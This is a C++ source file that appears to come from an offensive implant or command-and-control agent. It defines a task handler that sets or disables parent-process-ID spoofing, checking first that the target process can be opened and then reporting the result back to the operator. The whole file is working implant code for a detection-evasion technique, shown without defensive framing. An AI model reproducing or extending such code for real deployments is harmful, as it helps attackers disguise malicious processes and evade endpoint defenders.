#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_PPID_SPOOF

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_ppid_spoof(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t ppid = parser_int32( params );

    if ( ppid == 0 ) {
        inst.ppid_spoof = 0;
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "PPID spoof disabled" ) ) );
        return;
    }

    HANDLE h_process = inst.kernel32.OpenProcess(
        PROCESS_QUERY_INFORMATION, FALSE, ppid );

    if ( !h_process ) {
        char msg[64] = { 0 };
        char num[12];

        str_copy( msg, symbol<char*>( const_cast<char*>( "Cannot access PID " ) ) );
        uint32_t off = str_len( msg );
        int_to_str( num, ppid, 10 );
        uint32_t nlen = str_len( num );
        memory::copy( msg + off, num, nlen );
        msg[off + nlen] = '\0';

        queue_response( inst, task_uuid, RESPONSE_ERROR, msg );
        return;
    }

    inst.kernel32.CloseHandle( h_process );
    inst.ppid_spoof = ppid;

    char msg[64] = { 0 };
    char num[12];

    str_copy( msg, symbol<char*>( const_cast<char*>( "PPID spoof set to " ) ) );
    uint32_t off = str_len( msg );
    int_to_str( num, ppid, 10 );
    uint32_t nlen = str_len( num );
    memory::copy( msg + off, num, nlen );
    msg[off + nlen] = '\0';

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

#endif
